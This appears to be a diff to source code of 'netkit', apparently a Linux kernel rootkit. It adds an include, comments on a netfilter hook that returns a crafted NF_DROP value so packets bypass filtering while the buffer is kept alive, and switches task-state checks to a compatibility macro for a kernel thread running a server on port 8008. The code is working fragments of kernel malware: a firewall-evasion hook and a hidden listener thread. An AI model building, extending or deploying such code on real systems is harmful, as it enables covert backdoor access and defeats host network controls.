@@ -21,6 +21,7 @@
 #include "../../sys/socket.h"
 #include "../../sys/debug.h"
 #include "../../sys/symbol.h"
+#include "../../sys/task.h"
 
 #define SERVER_IP "0.0.0.0"
 #define SERVER_PORT 8008
@@ -40,8 +41,8 @@ static unsigned int hook_function(void *priv, struct sk_buff *skb, const struct 
 
     NETKIT_LOG("[*] bypassing netfilter...\n");
 
-    refcount_inc(&skb->users);
-    return NF_DROP | (0xFFFF << 16);
+    refcount_inc(&skb->users);  // incr refc so skb doesn't get free'd when ip_recv_final needs it
+    return NF_DROP | (0xFFFF << 16);  // -(retv >> 16) == 1
 }
 
 static struct nf_hook_ops nfho = {
@@ -218,14 +219,14 @@ int server_exit(void)
     }
 
     // don't stop thread when errored (i.e. because of sockets)
-    if (task_conn_loop->__state & (TASK_RUNNING | TASK_INTERRUPTIBLE | TASK_UNINTERRUPTIBLE))
+    if (TASK_STATE(task_conn_loop) & (TASK_RUNNING | TASK_INTERRUPTIBLE | TASK_UNINTERRUPTIBLE))
     {
         NETKIT_LOG("[*] stopping conn loop...\n");
         retv = kthread_stop(task_conn_loop);
         if (retv < 0)
             NETKIT_LOG("[!] kthread stop returned error\n");
     } else {
-        NETKIT_LOG("[-] conn loop is not running (state: %d)\n", task_conn_loop->__state);
+        NETKIT_LOG("[-] conn loop is not running (state: %d)\n", TASK_STATE(task_conn_loop));
     }
 
     // block until all kthreads (including conn loop) are handled
